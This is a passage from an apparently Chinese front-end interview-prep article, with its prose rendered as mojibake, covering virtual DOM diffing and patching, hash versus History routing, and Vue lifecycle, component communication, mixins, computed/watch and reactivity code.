StateEnums.Remove, index: i &#125;); &#125; &#125; // éåŽ†æ–°çš„list åˆ¤æ–­æ˜¯å¦èŠ‚ç‚¹æ–°å¢žæˆ–è€…æ˜¯ç§»åŠ¨ï¼ŒåŒæ—¶ä¹Ÿå¯¹ list åšèŠ‚ç‚¹çš„æ–°å¢žæˆ–è€…æ˜¯ç§»åŠ¨ newList &amp;&amp; newList.forEach(item =&gt; &#123; let key = item.key; if (isString(item)) &#123; key = item &#125; // å¯»æ‰¾æ—§çš„ children ä¸­æ˜¯å¦å«æœ‰å½“å‰èŠ‚ç‚¹ï¼Œæ²¡æœ‰çš„è¯éœ€è¦æ’å…¥ let index = list.indexOf(key); if (index === -1 || index == null) &#123; changes.push(&#123; type: StateEnums.Insert, node: item, index: i &#125;); list.splice(i, 0, key) &#125; else &#123; // æ‰¾åˆ°äº†ï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦éœ€è¦ç§»åŠ¨ if (index !== i) &#123; changes.push(&#123; type: StateEnums.Move, from: index, to: i &#125;); move(list, index, i) &#125; &#125; &#125;) return &#123; changes, list &#125;&#125;function getKeys(list) &#123; let keys = []; let text; list &amp;&amp; list.forEach(item =&gt; &#123; let key; if (isString(item)) &#123; key = [item] &#125; else if (item instanceof Element) &#123; key = item.key; &#125; keys.push(key) &#125;) return keys&#125; éåŽ†å­å…ƒç´ æ‰“æ ‡è¯† å¯¹äºŽæ•´ä¸ªå‡½æ•°æ¥è¯´ï¼Œä¸»è¦çš„åŠŸèƒ½å°±ä¸¤ä¸ª åˆ¤æ–­ä¸¤ä¸ªåˆ—è¡¨å·®å¼‚ ç»™èŠ‚ç‚¹æ‰“ä¸Šæ ‡è®° æ€»ä½“æ¥è¯´ï¼Œè¯¥å‡½æ•°çš„å®žçŽ°å¾ˆç®€å• 123456789101112131415161718192021222324252627function diffChildren(oldChild, newChild, index, patches) &#123; let &#123; changes, list &#125; = listDiff(oldChild, newChild, index, patches) if (changes.length) &#123; if (patches[index]) &#123; patches[index] = patches[index].concat(changes) &#125; else &#123; patches[index] = changes; &#125; &#125; // è®°å½•ä¸Šä¸€æ¬¡éåŽ†è¿‡çš„èŠ‚ç‚¹ let last = null; oldChild &amp;&amp; oldChild.forEach((item, i) =&gt; &#123; let child = item &amp;&amp; item.children; if (child) &#123; index = last &amp;&amp; last.children ? index + last.children.length + 1 : index + 1 let keyIndex = list.indexOf(item.key); let node = newChild[keyIndex]; // åªéåŽ†æ–°æ—§èŠ‚ç‚¹éƒ½å­˜åœ¨çš„èŠ‚ç‚¹ï¼Œå…¶ä»–æ–°å¢žæˆ–è€…åˆ é™¤çš„æ²¡æœ‰å¿…è¦éåŽ† if (node) &#123; dfs(item, node, index, patches) &#125; &#125; else &#123; index += 1 &#125; last = item; &#125;)&#125; æ¸²æŸ“å·®å¼‚ é€šè¿‡ä¹‹å‰çš„ç®—æ³•ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å¾—å‡ºä¸¤ä¸ªæ ‘çš„å·®å¼‚äº†ã€‚æ—¢ç„¶çŸ¥é“äº†å·®å¼‚ï¼Œå°±éœ€è¦å±€éƒ¨åŽ»æ›´æ–° DOM äº†ï¼Œä¸‹é¢å°±è®©æˆ‘ä»¬æ¥çœ‹çœ‹ Virtual Dom ç®—æ³•çš„æœ€åŽä¸€æ­¥éª¤ è¿™ä¸ªå‡½æ•°ä¸»è¦ä¸¤ä¸ªåŠŸèƒ½ æ·±åº¦éåŽ†æ ‘ï¼Œå°†éœ€è¦åšå˜æ›´æ“ä½œçš„å–å‡ºæ¥ å±€éƒ¨æ›´æ–° DOM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263let index = 0export default function patch(node, patchs) &#123; let changes = patchs[index] let childNodes = node &amp;&amp; node.childNodes // è¿™é‡Œçš„æ·±åº¦éåŽ†å’Œ diff ä¸­æ˜¯ä¸€æ ·çš„ if (!childNodes) index += 1 if (changes &amp;&amp; changes.length &amp;&amp; patchs[index]) &#123; changeDom(node, changes) &#125; let last = null if (childNodes &amp;&amp; childNodes.length) &#123; childNodes.forEach((item, i) =&gt; &#123; index = last &amp;&amp; last.children ? index + last.children.length + 1 : index + 1 patch(item, patchs) last = item &#125;) &#125;&#125;function changeDom(node, changes, noChild) &#123; changes &amp;&amp; changes.forEach(change =&gt; &#123; let &#123; type &#125; = change switch (type) &#123; case StateEnums.ChangeProps: let &#123; props &#125; = change props.forEach(item =&gt; &#123; if (item.value) &#123; node.setAttribute(item.prop, item.value) &#125; else &#123; node.removeAttribute(item.prop) &#125; &#125;) break case StateEnums.Remove: node.childNodes[change.index].remove() break case StateEnums.Insert: let dom if (isString(change.node)) &#123; dom = document.createTextNode(change.node) &#125; else if (change.node instanceof Element) &#123; dom = change.node.create() &#125; node.insertBefore(dom, node.childNodes[change.index]) break case StateEnums.Replace: node.parentNode.replaceChild(change.node.create(), node) break case StateEnums.Move: let fromNode = node.childNodes[change.from] let toNode = node.childNodes[change.to] let cloneFromNode = fromNode.cloneNode(true) let cloenToNode = toNode.cloneNode(true) node.replaceChild(cloneFromNode, toNode) node.replaceChild(cloenToNode, fromNode) break default: break &#125; &#125;)&#125; æœ€åŽVirtul Dom ç®—æ³•çš„å®žçŽ°ä¹Ÿæ˜¯ä¸‹é¢ä¸‰ä¸ªæ­¥éª¤ï¼š é€šè¿‡JS æ¥æ¨¡æ‹Ÿåˆ›å»º DOM å¯¹è±¡ åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡çš„å·®å¼‚ æ¸²æŸ“å·®å¼‚ 1234567891011121314151617let test4 = new Element('div', &#123; class: 'my-div' &#125;, ['test4'])let test5 = new Element('ul', &#123; class: 'my-div' &#125;, ['test5'])let test1 = new Element('div', &#123; class: 'my-div' &#125;, [test4])let test2 = new Element('div', &#123; id: '11' &#125;, [test5, test4])let root = test1.render()let pathchs = diff(test1, test2)console.log(pathchs)setTimeout(() =&gt; &#123; console.log('å¼€å§‹æ›´æ–°') patch(root, pathchs) console.log('ç»“æŸæ›´æ–°')&#125;, 1000) è·¯ç”±æ¨¡å¼æ¶‰åŠçš„é¢è¯•é¢˜ç›®ï¼šå‰ç«¯è·¯ç”±åŽŸç†ï¼Œä¸¤ç§å®žçŽ°æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å‰ç«¯è·¯ç”±å®žçŽ°èµ·æ¥ä¸éš¾ï¼Œæœ¬è´¨å°±æ˜¯ç›‘å¬ URL çš„å˜åŒ–ï¼Œç„¶åŽåŒ¹é…è·¯ç”±è§„åˆ™ï¼Œæ˜¾ç¤ºå¯¹åº”çš„é¡µé¢ï¼Œå¹¶ä¸”æ— é¡»åˆ·æ–°é¡µé¢ï¼Œç›®å‰å‰ç«¯ä½¿ç”¨çš„è·¯ç”±å¤§æ¦‚æœ‰ä¸¤ç§æ–¹å¼ï¼š hash æ¨¡å¼ History æ¨¡å¼ Hashwww.test.com/#/ å°±æ˜¯ Hash URLï¼Œå½“ # åŽé¢çš„å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¯ä»¥é€šè¿‡ hashchange äº‹ä»¶æ¥ç›‘å¬åˆ° URL çš„å˜åŒ–ï¼Œä»Žè€Œè¿›è¡Œè·³è½¬é¡µé¢ï¼Œå¹¶ä¸”æ— è®ºå“ˆå¸Œå€¼å¦‚ä½•å˜åŒ–ï¼ŒæœåŠ¡ç«¯æŽ¥æ”¶åˆ°çš„ URL è¯·æ±‚æ°¸è¿œæ˜¯ www.test.comã€‚ 123window.addEventListener('haschange',()=&gt;&#123; // å…·ä½“é€»è¾‘...&#125;); Hash æ¨¡å¼ç›¸å¯¹ç®€å•ï¼Œå¹¶ä¸”å…¼å®¹æ€§æ›´å¥½ HistoryHistory æ¨¡å¼ æ˜¯ HTML5 æŽ¨å‡ºçš„æ–°åŠŸèƒ½ï¼Œä¸»è¦ä½¿ç”¨ history.pushState å’Œ history.replaceState æ”¹å˜ URLã€‚ é€šè¿‡ History æ¨¡å¼æ”¹å˜ URL åŒæ ·ä¸ä¼šå¼•èµ·æµè§ˆå™¨çš„åˆ·æ–°ï¼Œåªä¼šæ›´æ–°æµè§ˆå™¨çš„åŽ†å²è®°å½• 1234// æ–°å¢žåŽ†å²è®°å½•history.pushState(stateObj,title,URL);// æ›¿æ¢å½“å‰çš„åŽ†å²è®°å½•history.replaceState(stateObj,title,URL); å½“ç”¨æˆ·åšå‡ºæµè§ˆå™¨åŠ¨ä½œçš„æ—¶å€™ï¼Œæ¯”å¦‚ç‚¹å‡»åŽé€€æŒ‰é’®ä¼šè§¦å‘ popState äº‹ä»¶ 1234window.addEventListener('popstate',e=&gt;&#123; // e.state å°±æ˜¯ push(stateObject) ä¸­çš„ stateObject console.log(e.state);&#125;); ä¸¤ç§æ¨¡å¼å¯¹æ¯” Hash æ¨¡å¼åªå¯ä»¥æ›´æ”¹ # å·åŽé¢çš„å†…å®¹ã€‚History æ¨¡å¼å¯ä»¥é€šè¿‡ API è®¾ç½®ä»»æ„çš„åŒæºçš„ URL History æ¨¡å¼å¯ä»¥é€šè¿‡ API æ·»åŠ ä»»æ„çš„æ•°æ®åˆ°åŽ†å²è®°å½•ä¸­ï¼ŒHash æ¨¡å¼åªèƒ½æ›´æ”¹å“ˆå¸Œå€¼ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸² Hash æ¨¡å¼æ— éœ€åŽç½®é…ç½®ï¼Œå¹¶ä¸”å…¼å®¹æ€§å¥½ã€‚History æ¨¡å¼åœ¨ç”¨æˆ·è¾“å…¥åœ°å€æˆ–è€…åˆ·æ–°é¡µé¢çš„æ—¶å€™ä¼šå‘èµ· URL è¯·æ±‚ï¼ŒåŽç«¯éœ€è¦é…ç½® index.html ç”¨äºŽåŒ¹é…ä¸åˆ°é™æ€èµ„æºçš„æ—¶å€™ Vue å¸¸è€ƒçš„åŸºæœ¬çŸ¥è¯†ç‚¹å£°æ˜Žå‘¨æœŸé’©å­å‡½æ•°åœ¨ beforeCreate é’©å­å‡½æ•°ä½¿ç”¨çš„æ—¶å€™ï¼Œæ˜¯èŽ·å–ä¸åˆ° props æˆ–è€… dataä¸­çš„æ•°æ®çš„ï¼Œå› ä¸ºè¿™äº›æ•°æ®éƒ½åœ¨ initState ä¸­ ç„¶åŽä¼šæ‰§è¡Œ created é’©å­å‡½æ•°ï¼Œè¿™ä¸€æ­¥å¯ä»¥è®¿é—®åˆ°ä¹‹å‰ä¸èƒ½è®¿é—®åˆ°çš„æ•°æ®ï¼Œä½†æ˜¯è¿™æ—¶å€™ï¼Œç»„ä»¶è¿˜æ²¡æœ‰è¢«æŒ‚è½½ã€‚ beforeMount é’©å­å‡½æ•°ï¼Œå¼€å§‹æž„å»º VDOMï¼Œæœ€åŽæ‰§è¡Œ mounted é’©å­å‡½æ•°ï¼Œå¹¶å°† VDOM æ¸²æŸ“ä¸ºçœŸå®žçš„ DOM å¹¶ä¸”æ¸²æŸ“æ•°æ®ã€‚ç»„ä»¶ä¸­å¦‚æžœæœ‰å­ç»„ä»¶çš„è¯ï¼Œä¼šé€’å½’æŒ‚è½½å­ç»„ä»¶ï¼Œåªæœ‰å½“æ‰€æœ‰ç»„ä»¶å…¨éƒ¨æŒ‚è½½å®Œæ¯•ï¼Œæ‰ä¼šæ‰§è¡Œæ ¹ç»„ä»¶çš„æŒ‚è½½é’©å­ã€‚ æ•°æ®æ›´æ–°æ—¶ä¼šè°ƒç”¨é’©å­å‡½æ•° beforeUpdate å’Œ updated ï¼Œåˆ†åˆ«æ˜¯åœ¨æ•°æ®æ›´æ–°å‰åŽä¼šè°ƒç”¨ keep-alive ç‹¬æœ‰çš„ç”Ÿå‘½å‘¨æœŸï¼Œactivated å’Œ deactivatedã€‚ç”¨ keep-alive åŒ…è£¹çš„ç»„ä»¶åˆ‡æ¢æ—¶ä¸ä¼šè¿›è¡Œé”€æ¯ï¼Œè€Œæ˜¯ç¼“å­˜åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œ deactivated é’©å­å‡½æ•°,å‘½ä¸­ç¼“å­˜æ¸²æŸ“åŽä¼šæ‰§è¡Œ atived é’©å­å‡½æ•° æœ€åŽå°±æ˜¯é”€æ¯ç»„ä»¶çš„é’©å­å‡½æ•° beforeDestory å’Œ destroyed .å‰è€…é€‚åˆç§»é™¤äº‹ä»¶ã€å®šæ—¶å™¨ç­‰ç­‰ï¼Œå¦åˆ™å¯èƒ½ä¼šå¼•èµ·å†…å­˜æ³„éœ²çš„é—®é¢˜ï¼Œç„¶åŽè¿›è¡Œä¸€ç³»åˆ—çš„é”€æ“ä½œï¼Œå¦‚æžœæœ‰å­ç»„ä»¶çš„è¯ï¼Œä¹Ÿä¼šé€’å½’é”€æ¯å­ç»„ä»¶ï¼Œæ‰€æœ‰å­ç»„ä»¶éƒ½é”€æ¯å®Œæ¯•ä¹‹åŽæ‰ä¼šæ‰§è¡Œæ ¹ç»„ä»¶çš„ destroyed é’©å­å‡½æ•° ç»„ä»¶é€šä¿¡ä¸€èˆ¬æœ‰ä¸€ä¸‹å‡ ç§æƒ…å†µ çˆ¶å­ç»„ä»¶ å…„å¼Ÿç»„ä»¶ è·¨å¤šå±‚æ¬¡ç»„ä»¶ ä»»æ„ç»„ä»¶ çˆ¶å­ç»„ä»¶é€šä¿¡çˆ¶ç»„ä»¶é€šè¿‡ props ä¼ é€’ç»™å­ç»„ä»¶ï¼Œå­ç»„ä»¶é€šè¿‡ emit å‘é€äº‹ä»¶ä¼ é€’æ•°æ®ç»™çˆ¶ç»„ä»¶ï¼Œè¿™ä¸¤ç§æ–¹å¼æ˜¯å¸¸ç”¨çš„çˆ¶å­é€šä¿¡å®žçŽ°æ–¹æ³• è¿™ç§çˆ¶å­ç»„ä»¶å°±æ˜¯å…¸åž‹çš„å•å‘æ•°æ®æµï¼Œçˆ¶ç»„ä»¶é€šè¿‡ props ä¼ é€’æ•°æ®ï¼Œå­ç»„ä»¶ä¸èƒ½ç›´æŽ¥ä¿®æ”¹ props,è€Œæ˜¯å¿…é¡»é€šè¿‡å‘é€äº‹ä»¶çš„æ–¹å¼å‘ŠçŸ¥çˆ¶ç»„ä»¶ä¿®æ”¹æ•°æ®ã€‚ å¦å¤–è¿™ä¸¤ç§æ–¹å¼è¿˜å¯ä»¥ä½¿ç”¨è¯­æ³•ç³– v-model æ¥ç›´æŽ¥å®žçŽ°ï¼Œå› ä¸º v-model ä¼šè§£æžæˆåä¸º value çš„ prop å’Œ input çš„äº‹ä»¶ã€‚è¿™ç§è¯­æ³•ç³–çš„æ–¹å¼æ˜¯å…¸åž‹çš„åŒå‘ç»‘å®šï¼Œå¸¸ç”¨äºŽ UIæŽ§ä»¶ä¸Šé¢ï¼Œä½†æ˜¯æ ¹æœ¬ä¸Šè¿˜æ˜¯é€šè¿‡äº‹ä»¶çš„æ–¹æ³•æ¥è®©çˆ¶ç»„ä»¶ä¿®æ”¹æ•°æ®ã€‚ è¿˜å¯ä»¥é€šè¿‡ \$parent æˆ–è€…æ˜¯ \$children å¯¹è±¡æ¥è®¿é—®ç»„ä»¶å®žä¾‹ä¸­æ–¹æ³•å’Œæ•°æ®ã€‚ å¦å¤–ä½¿ç”¨ Vue2.3 ä»¥ä¸Šçš„ç‰ˆæœ¬è¿˜å¯ä»¥ä½¿ç”¨ \$ listeners å’Œ .sycn ä¸¤ä¸ªå±žæ€§ \$ listeners å±žæ€§ä¼šå°†çˆ¶ç»„ä»¶ä¸­ï¼ˆä¸å« .native ä¿®é¥°å™¨çš„ï¼‰v-on äº‹ä»¶ç›‘å¬å™¨ä¼ é€’ç»™å­ç»„ä»¶ï¼Œå­ç»„ä»¶å¯ä»¥é€šè¿‡è®¿é—® \$listeners æ¥è‡ªå®šä¹‰ç›‘å¬å™¨ .sync å±žæ€§æ˜¯è¯­æ³•ç³–ï¼Œå¯ä»¥å¾ˆç®€å•å®žçŽ°å­ç»„ä»¶å’Œçˆ¶ç»„ä»¶çš„é€šä¿¡ 12345678&lt;!--çˆ¶ç»„ä»¶ä¸­---&gt;&lt;input :value.sync=&quot;value&quot;&gt;&lt;!--ä¸Šé¢å†™æ³•ç­‰åŒäºŽ--&gt;&lt;input :value=&quot;value&quot; @update:value=&quot;v=&gt;value=v&quot;&gt;&lt;/comp&gt;&lt;!--å­ç»„ä»¶ä¸­--&gt;&lt;script&gt; this.$emit(&apos;update:value&apos;,1)&lt;/script&gt; å…„å¼Ÿç»„ä»¶é€šä¿¡å¯ä»¥é€šè¿‡æŸ¥æ‰¾çˆ¶ç»„ä»¶ä¸­çš„å­ç»„ä»¶çš„å®žçŽ°ï¼Œå°±æ˜¯ this.$parent.$children åœ¨ $childrenä¸­å¯ä»¥é€šè¿‡ name æŸ¥è¯¢åˆ°éœ€è¦çš„ç»„ä»¶å®žä¾‹ï¼Œç„¶åŽè¿›è¡Œé€šä¿¡ è·¨å¤šå±‚ç»„ä»¶é€šä¿¡å¯ä»¥ä½¿ç”¨ Vue2.2 æ–°å¢žçš„ API provide/inject ï¼Œè™½ç„¶åœ¨æ–‡æ¡£ä¸­ä¸æ”¯æŒä½¿ç”¨åœ¨ä¸šåŠ¡ä¸­ï¼Œä½†æ˜¯å¦‚æžœç”¨å¾—å¥½çš„è¯è¿˜æ˜¯æœ‰ç”¨çš„ å‡è®¾æœ‰çˆ¶ç»„ä»¶ A ç„¶åŽæœ‰ä¸€ä¸ªè·¨å¤šå±‚çº§çš„å­ç»„ä»¶B 1234567891011121314// çˆ¶ç»„ä»¶Aexport default&#123; provide:&#123; data:1 &#125;&#125;// å­ç»„ä»¶ Bexport default &#123; inject:['data'], mounted()&#123; // æ— è®ºè·¨å‡ å±‚éƒ½èƒ½èŽ·å–åˆ°çˆ¶ç»„ä»¶çš„ data å±žæ€§ console.log(this.data); //=&gt;1 &#125;&#125; ä»»æ„ç»„ä»¶è¿™ç§æ–¹å¼å¯ä»¥é€šè¿‡ Vuex æˆ–è€… Event Bus è§£å†³ï¼Œå¦å¤–å¦‚æžœä¸æ€•éº»çƒ¦çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼æ¥è§£å†³ä¸Šè¿°çš„æ‰€æœ‰é€šä¿¡æƒ…å†µ extend èƒ½åšä»€ä¹ˆä½œç”¨æ˜¯æ‰©å±•ã¢Ÿç”Ÿæˆä¸€ä¸ªæž„é€ å™¨ï¼Œé€šå¸¸ä¼šä¸Ž $mountä¸€èµ·ä½¿ç”¨ 1234567891011121314// åˆ›å»ºç»„ä»¶æž„é€ å™¨let Component = Vue.extend(&#123; template:'&lt;div&gt;test&lt;/div&gt;'&#125;)// æŒ‚è½½åˆ° #app ä¸Šnew.Component().$mount('#app');// é™¤äº†ä¸Šé¢æ–¹å¼è¿˜å¯ä»¥æ¥æ‰©å±•åŽŸæ¥çš„ç»„ä»¶let SuperComponent = Vue.extend(Component)new SuperComponent(&#123; created()&#123; console.log(1); &#125;&#125;)new SuperComponent().$mount('#app') mixin å’Œ mixins çš„åŒºåˆ«mixin ç”¨äºŽå…¨å±€æ··å…¥ï¼Œä¼šå½±å“åˆ°æ¯ä¸ªç»„ä»¶å®žä¾‹ï¼Œé€šå¸¸æ’ä»¶éƒ½æ˜¯è¿™æ ·åšåˆå§‹åŒ–çš„ 12345Vue.mixin(&#123; beforeCreate()&#123; // é€»è¾‘ï¼Œè¿™ç§æ–¹å¼ä¼šå½±å“åˆ°æ‰€æœ‰ç»„ä»¶çš„ beforeCreate é’©å­å‡½æ•° &#125;&#125;) æ–‡æ¡£ä¸å»ºè®®ç›´æŽ¥åœ¨åº”ç”¨ä¸­ä½¿ç”¨ mixin ï¼Œä½†æ˜¯ä¸æ»¥ç”¨çš„è¯ï¼Œå¯ä»¥å…¨å±€æ··å…¥è£…å¥½çš„ ajax æˆ–è€…ä¸€äº›å·¥å…·å‡½æ•°ç­‰ç­‰ mixins åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ä½¿ç”¨çš„æ‰©å±•ç»„ä»¶çš„æ–¹å¼äº†ï¼Œå¦‚æžœå¤šä¸ªç»„ä»¶ä¸­æœ‰ç›¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå°±å¯ä»¥å°†è¿™äº›é€»è¾‘å‰¥ç¦»å‡ºæ¥ï¼Œé€šè¿‡ mixins æ··å…¥ä»£ç ï¼Œæ¯”å¦‚ä¸Šæ‹‰ä¸‹æ‹‰åŠ è½½æ•°æ®è¿™ç§ç­‰ç­‰ã€‚ å¦å¤–è¦æ³¨æ„çš„æ˜¯ mixins æ··å…¥çš„é’©å­å‡½æ•°ä¼šå…ˆäºŽç»„ä»¶çš„é’©å­å‡½æ•°æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨æ™•å€’åŒåé€‰é¡¹çš„æ—¶å€™ä¹Ÿä¼šæœ‰é€‰æ‹©æ€§çš„è¿›è¡Œåˆå¹¶ã€‚ computed å’Œ watch çš„åŒºåˆ«computed æ˜¯è®¡ç®—å±žæ€§ï¼Œä¾èµ–å…¶ä»–å±žæ€§æ¥è®¡ç®—ï¼Œå¹¶ä¸” computed çš„å€¼æœ‰ç¼“å­˜ï¼Œåªæœ‰å½“å€¼å˜åŒ–æ‰ä¼šè¿”å›žå†…å®¹ã€‚ watch ç›‘å¬åˆ°å€¼çš„å˜åŒ–å°±ä¼šæ‰§è¡Œå›žè°ƒï¼Œåœ¨å›žè°ƒä¸­å¯ä»¥è¿›è¡Œä¸€äº›é€»è¾‘æ“ä½œã€‚ æ‰€ä»¥ä¸€èˆ¬æ¥è¯´éœ€è¦ä¾èµ–åˆ«çš„å±žæ€§æ¥åŠ¨æ€èŽ·å¾—å€¼çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ computed ï¼Œå¯¹äºŽç›‘å¬åˆ°å€¼çš„å˜åŒ–éœ€è¦åšçš„ä¸€äº›å¤æ‚ä¸šåŠ¡é€»è¾‘çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ watch å¦å¤–è¿™ä¸¤è€…éƒ½æ”¯æŒå¯¹è±¡çš„å†™æ³•ï¼š 123456789101112131415161718192021222324vm.$watch('obj',&#123; // æ·±åº¦éåŽ† deep:true, // ç«‹å³è§¦å‘ immediate:true, // æ‰§è¡Œå‡½æ•° handler:function(val,oldVal)&#123;&#125;&#125;)var vm = new Vue(&#123; data:&#123;a:1&#125;, computed:&#123; aPlus:&#123; // this.aPlus çš„æ—¶å€™è§¦å‘ get:function()&#123; return this.a + 1 &#125;, // this.aPlus = 1æ—¶è§¦å‘ set:function(v)&#123; this.a = v - 1 &#125; &#125; &#125;&#125;) keep-aliveç»„ä»¶çš„ä½œç”¨éœ€è¦éœ€è¦åœ¨ç»„ä»¶åˆ‡æ¢æ—¶ï¼Œä¿å­˜ä¸€äº›ç»„ä»¶çš„çŠ¶æ€é˜²æ­¢å¤šæ¬¡æ¸²æŸ“ï¼Œå¯ä»¥ä½¿ç”¨ keep-alive ç»„ä»¶åŒ…è£¹éœ€è¦ä¿å­˜çš„ç»„ä»¶ å¯¹äºŽ keep-alive ç»„ä»¶æ¥è¯´ï¼Œå®ƒæ‹¥æœ‰ä¸¤ä¸ªç‹¬æœ‰çš„å£°æ˜Žå‘¨æœŸå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ activated å’Œ deactivated ï¼Œç”¨ keep-alive åŒ…è£¹çš„ç»„ä»¶åœ¨åˆ‡æ¢æ—¶ä¸ä¼šè¿›è¡Œé”€æ¯ï¼Œè€Œæ˜¯ç¼“å­˜åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œ deactivated é’©å­å‡½æ•°ï¼Œå‘½ä¸­ç¼“å­˜æ¸²æŸ“åŽä¼šæ‰§è¡Œ actived é’©å­å‡½æ•° v-show å’Œ v-if çš„åŒºåˆ«v-show åªæ˜¯åœ¨ displayï¼šnone å’Œ displayï¼šblock ä¹‹é—´åˆ‡æ¢ã€‚æ— è®ºåˆå§‹æ¡ä»¶æ˜¯ä»€ä¹ˆéƒ½ä¼šè¢«æ¸²æŸ“å‡ºæ¥ï¼ŒåŽé¢åªéœ€è¦åˆ‡æ¢ CSSï¼ŒDOM è¿˜æ˜¯ä¸€ç›´ä¿ç•™çš„ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œv-show åœ¨åˆå§‹æ¸²æŸ“æœ‰æ›´é«˜çš„å¼€é”€ï¼Œä½†æ˜¯åˆ‡æ¢å¼€é”€å°ï¼Œæ›´é€‚åˆäºŽé¢‘ç¹åˆ‡æ¢çš„åœºæ™¯ v-if çš„è¯å°±æ¶‰åŠ Vue åº•å±‚çš„ç¼–è¯‘ï¼Œå½“å±žæ€§åˆå§‹ä¸º falseï¼Œç»„ä»¶å°±ä¸ä¼šè¢«æ¸²æŸ“ï¼Œç›´åˆ°æ¡ä»¶ä¸º trueï¼Œå¹¶ä¸”åˆ‡æ¢æ¡ä»¶æ—¶ä¼šè§¦å‘é”€æ¯/æŒ‚è½½ç»„ä»¶ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´åœ¨åˆ‡æ¢å¼€é”€æ›´é«˜ï¼Œæ›´é€‚åˆä¸ç»å¸¸åˆ‡æ¢çš„åœºæ™¯ï¼Œå¹¶ä¸”åŸºäºŽ v-if çš„è¿™ç§æƒ°æ€§æ¸²æŸ“æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¿…è¦çš„æ—¶å€™æ‰åŽ»æ¸²æŸ“ç»„ä»¶ï¼Œå‡å°‘æ•´ä¸ªé¡µé¢çš„åˆå§‹æ¸²æŸ“å¼€é”€ã€‚ ç»„ä»¶ä¸­ data ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨å¯¹è±¡ç»„ä»¶å¤ç”¨æ—¶æ‰€æœ‰çš„å®žä¾‹éƒ½ä¼šå…±äº« data ï¼Œå¦‚æžœdata æ˜¯å¯¹è±¡çš„è¯ï¼Œå°±ä¼šé€ æˆä¸€ä¸ªç»„ä»¶ä¿®æ”¹ data ä¹‹åŽä¼šå½±å“åˆ°å…¶ä»–æ‰€æœ‰çš„ç»„ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† data å†™æˆå‡½æ•°ï¼Œæ¯æ¬¡ç”¨åˆ°å°±è°ƒç”¨ä¸€æ¬¡å‡½æ•°æ¥èŽ·å¾—æ–°çš„æ•°æ® å½“æˆ‘ä»¬ä½¿ç”¨ new Vue() çš„æ–¹å¼çš„æ—¶å€™ï¼Œæ— è®ºæˆ‘ä»¬å°† data è®¾ç½®ä¸ºå¯¹è±¡è¿˜æ˜¯å‡½æ•°éƒ½æ˜¯å¯ä»¥çš„ï¼Œå› ä¸º new Vueï¼ˆï¼‰ çš„æ–¹å¼æ˜¯ç”Ÿæˆä¸€ä¸ªæ ¹ç»„ä»¶ï¼Œä¹Ÿå°±ä¸å­˜åœ¨å…±äº« data çš„æƒ…å†µäº†ã€‚ è¿›é˜¶çŸ¥è¯†ç‚¹å“åº”å¼åŽŸç†Vue å†…éƒ¨ä½¿ç”¨äº† Object.defineProperty() æ¥å®žçŽ°æ•°æ®å“åº”å¼ï¼Œé€šè¿‡å‡½æ•°å¯ä»¥ç›‘å¬åˆ° set å’Œ get äº‹ä»¶ 12345678910111213141516171819202122232425262728293031323334const data = &#123; name: 'lbh' &#125;observe(data);let &#123; name &#125; = data;data.name = 'haha'; function observe(obj) &#123; // åˆ¤æ–­ç±»åž‹ if (!obj || typeof obj !== 'object') &#123; return &#125; Object.keys(obj).forEach(key =&gt; &#123; defineReactive(obj, key, obj[key]) &#125;) &#125;function defineReactive(obj, key, val) &#123; // é€’å½’å­å±žæ€§ observe(val); Object.defineProperty(obj, key, &#123; // å¯æžšä¸¾ enumerable: true, // å¯é…ç½® configurable: true, // è‡ªå®šä¹‰å‡½æ•° get: function reactiveGetter() &#123; console.log('get val'); return val; &#125;, set: function reactiveSetter(newVal) &#123; console.log('change val'); val = newVal; &#125; &#125;)&#125; ä¸Šé¢ä»£ç ç®€å•å®žçŽ°äº†å¦‚ä½•ç›‘å¬æ•°æ®çš„ set å’Œ get äº‹ä»¶ï¼Œå› ä¸ºè‡ªå®šä¹‰å‡½æ•°ä¸€å¼€å§‹æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œåªæœ‰å…ˆæ‰§è¡Œäº†ä¾èµ–æ”¶é›†ï¼Œæ‰èƒ½åœ¨å±žæ€§æ›´æ–°çš„æ—¶å€™æ´¾å‘æ›´æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬æŽ¥ä¸‹æ¥éœ€è¦å…ˆè§¦å‘ä¾èµ–æ”¶é›† 123&lt;div&gt; &#123;&#123;name&#125;&#125;&lt;/div&gt; åœ¨è§£æžä¸Šé¢çš„æ¨¡æ¿ä»£ç æ—¶å€™ï¼Œä¼šé‡åˆ° å°±ä¼šè¿›è¡Œä¾èµ–æ”¶é›† å®žçŽ°ä¸€ä¸ª Dep ç±»ï¼Œç”¨äºŽè§£è€¦å±žæ€§çš„ä¾èµ–æ”¶é›†å’Œæ´¾å‘æ›´æ–°æ“ä½œ 1234567891011121314151617class Dep &#123; constructor() &#123; this.subs = [] &#125; // æ·»åŠ ä¾èµ– addSub(sub) &#123; this.subs.push(sub) &#125; // æ›´æ–° notify() &#123; this.subs.forEach(sub =&gt; &#123; sub.update(); &#125;) &#125;&#125;// å…¨å±€å±žæ€§ï¼Œé€šè¿‡è¯¥å±žæ€§é…ç½® watcherDep.target = null; å½“éœ€è¦æ”¶é›†ä¾èµ–çš„æ—¶å€™è°ƒç”¨ 